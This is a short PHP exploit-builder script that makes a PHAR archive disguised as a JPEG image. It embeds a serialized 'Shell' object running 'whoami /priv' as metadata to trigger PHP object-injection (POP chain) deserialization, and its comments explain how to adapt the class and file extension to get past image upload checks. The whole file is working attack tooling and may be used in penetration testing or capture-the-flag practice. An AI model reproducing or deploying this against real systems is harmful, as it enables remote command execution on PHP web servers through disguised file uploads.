<?php

# Autoload Shell class
spl_autoload_register(function ($classname){
    include $classname . '.php';
});
# You have to change the class in the code
# to the one that you're exploiting
# to kickstart a POP chain

# Also change the jpg extension to anything
# you want.
# For images, it could be jpeg, jpg, gif...
# whatever you want.

try{

    # Class to exploit
    $shellObj = new Shell('whoami /priv');

    # Create a phar archive
    $pharName = 'stitchedPhar.phar';
    $pharArchive = new Phar($pharName);

    # Start buffering
    $pharArchive->startBuffering();

    # Set the metadata to the serialized object representation
    $pharArchive->setMetadata($shellObj);

    # Add files to the phar archive
    $pharArchive['pharFile.php'] = file_get_contents('pharFile.php');
    $pharArchive['pharNonBootstrappedFile.php'] = file_get_contents('pharNonBootstrappedFile.php');

    # Create the stub
    $defaultStubContent = $pharArchive::createDefaultStub("pharFile.php");
    $imageContent = file_get_contents('rickastely.jpg'); // Change the image here
    $pharArchive->setStub($imageContent . $defaultStubContent);

    # Stop buffering
    $pharArchive->stopBuffering();

    # Rename the file
    rename($pharName, 'stitchedPhar.jpg');
}
catch(Exception $e){
    $e->getMessage();
}



?>